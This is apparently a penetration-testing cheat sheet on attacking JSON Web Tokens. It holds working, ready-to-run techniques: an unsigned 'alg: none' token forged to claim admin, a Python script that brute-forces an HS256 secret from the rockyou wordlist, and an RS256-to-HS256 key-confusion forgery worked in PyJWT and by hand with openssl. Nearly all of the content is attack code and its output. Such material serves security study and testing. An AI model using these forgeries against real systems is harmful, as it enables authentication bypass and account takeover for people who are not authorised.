# [JSON Web Token (JWT)](https://jwt.io)

Token
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjQyIiwibmFtZSI6Imhlcm1lcyJ9.N-qpd1yfvPpq-chYTaaoK7Z_Katb_muTt5XuKN3o6-Q
```

Header
```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
{"alg":"HS256","typ":"JWT"}
```

Payload
```json
eyJpZCI6IjQyIiwibmFtZSI6Imhlcm1lcyJ9
{"id":"42","name":"hermes"}
```

Signatue (secret is `hermes`)
```
N-qpd1yfvPpq-chYTaaoK7Z_Katb_muTt5XuKN3o6-Q
```

## No signature verification

Header
```json
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
{"alg":"none","typ":"JWT"}
```

Payload
```json
eyJpZCI6IjQyIiwibmFtZSI6ImFkbWluIn0
{"id":"42","name":"admin"}
```

Token
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6IjQyIiwibmFtZSI6ImFkbWluIn0.
```

## Weak signature secret

```python
import jwt

wordlist    = "rockyou.txt"
algo        = "HS256"
token       = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjQyIiwibmFtZSI6Imhlcm1lcyJ9.N-qpd1yfvPpq-chYTaaoK7Z_Katb_muTt5XuKN3o6-Q"

for word in open(wordlist):
    try:
        key = word.strip()
        decoded = jwt.decode(token, key, algorithm=algo)
        if decoded:
            print("*** Found key ***: {}".format(key))
            exit(0)
    except Exception as e:
        print("Exception: {}".format(e))
        print("Invalid key: {}".format(key))
```

## RS256 Public key

- RS256 uses the private key to signing and the public key for authentication.
- Changing the algorithm from RS256 to HS256 leads to the public key being used as the secret key for HS256.

### Using PyJWT

```python
# Exception: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
# This only works with pyjwt <= 0.4.3

import jwt

algo        = "HS256"
encoded     = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imhlcm1lcyJ9.CfBoUKSY272oTcKiXMSF9k0PUKLeVlYDkfNMdU9HagMpBuekUWK1jTXuCCErassWM8ytj9Wi9ZNPjBWcIQJ3W4P5bgwFX6mfPSYPwHp2TOyB9KqH_PU1VP3_cb1ISyKRTjY-Pop9KKL4QBilqARLNIuViLIqbc6EEKPN5moFiv43ediJL-xLNakUGDPdJLSJDFyo-8U35w7LVlHzKWAdLwnMbKwZp_6sOTjrTPXLXyYkMNGr2aM-bQsL3-1Rs_LL1o75L2fq_jGHRoyb2gJg3LBdh2NlmYn2WXh9hu038q3nRPsSEeObytWNooqFk5b1EPI_2uDopdJ6K7QiruefXA"
public_key  = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyODzZ+jC8F4q5NdfPCx6\nD06nqrhosdlF5+1nWMGKP4stFkSMze3b13w0XAUV34JrgPtfLqSr3C/A0fnagOzn\nSNk7p4eTTcBynufHkOeyE5Iq57yMOxYh6BqzPLaQDBWahfaL5A6seMz+hTZv521S\nqXHZAjm7HlKvVpt3PBvNQ9QHS9eyihKhfCvvg+giYz2mXAKJ+pk3V74U1vxpyIDs\nH0fTTvlGxkD6MSluKFcXblIQnuGUs2ZbepQSybBSKBZRhu1Ez7+GlzeBTVUAzJf4\nGTF5kuI8u3NVuOkTX76GTCeXveqiZilf1+APGacZnoqth2jFitPsfkQ8jQTNHkQv\nyQIDAQAB\n-----END PUBLIC KEY-----'

try:
    decoded = jwt.decode(encoded, public_key, algorithm='HS256')
    print(decoded)

    encoded = jwt.encode({u'username': u'admin'}, public_key, algorithm='HS256')
    print(encoded)
except Exception as e:
    print("Exception: {}".format(e))
```

### Manually

```bash
# Convert key to hex
cat key.pem | xxd -p | tr -d "\\n"

# Apply HMAC signature on Header + Payload
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541794f447a5a2b6a4338463471354e6466504378360a4430366e7172686f73646c46352b316e574d474b50347374466b534d7a653362313377305841555633344a72675074664c71537233432f4130666e61674f7a6e0a534e6b3770346554546342796e7566486b4f6579453549713537794d4f7859683642717a504c6151444257616866614c35413673654d7a2b68545a76353231530a7158485a416a6d37486c4b76567074335042764e513951485339657969684b6866437676672b6769597a326d58414b4a2b706b335637345531767870794944730a4830665454766c47786b44364d536c754b466358626c49516e75475573325a6265705153796242534b425a52687531457a372b476c7a6542545655417a4a66340a475446356b75493875334e56754f6b545837364754436558766571695a696c66312b41504761635a6e6f717468326a4669745073666b51386a51544e486b51760a79514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d

(stdin)= fd61d8b618677cab025c142cad4be23fc08ac00508fa4adbfd865c4c739da761

# Convert hex to base64 url (removing paddings '=')
python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('fd61d8b618677cab025c142cad4be23fc08ac00508fa4adbfd865c4c739da761')).replace('=','')\")"

# Add signature to Header + Payload
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0._WHYthhnfKsCXBQsrUviP8CKwAUI-krb_YZcTHOdp2E
```

# References

- [JSON Web Token (JWT)](https://jwt.io)